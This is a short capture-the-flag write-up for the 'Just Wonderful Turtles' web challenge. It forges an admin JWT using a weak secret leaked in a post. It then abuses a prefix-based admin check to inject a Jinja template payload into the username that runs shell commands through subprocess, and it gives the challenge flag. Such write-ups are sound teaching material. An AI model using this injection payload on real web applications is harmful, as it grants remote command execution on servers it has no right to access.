# [Just Wonderful Turtles](https://hack.cert.pl/challenge/justwonderfulturtles)

## Task

We get access to a website full of turtles with a login system.

## Solution

After logging in as `guest:guest`, one post gives a hint:

> (admin): Just Wonderful Turtle team secret is: we think that 'turtlerocks'!


It turns out that the JWT secret key is indeed `turtlerocks`.

After logging in as admin, we get access to the `/admin` route, in which we get another hint after inspecting page source.

```html
<!-- to John - we have admin permission verification based on .startswith("admin"). For now it is okay, as there only guest user, but when we will roll out registration functionality, we have to change it! It is because user that would start with `admin` will be able to access our secret place! - yours trully, Jack -->
```

After some experimenting, we can find a SSTI vulnerability in the admin username.

To get the flag, we need to craft a JWT token with following username:

```
admin {{ dict.mro()[-1][request.args.s]()[372](request.args.cmd,shell=True,stdout=-1).communicate()[0].strip() }}
```

And then access `/admin?s=__subclasses__&cmd=cat%20/flag.txt`, and voila!

[Solve script](./solve.py)

`ecsc24{turt13s_REa1lY_r0ck!}`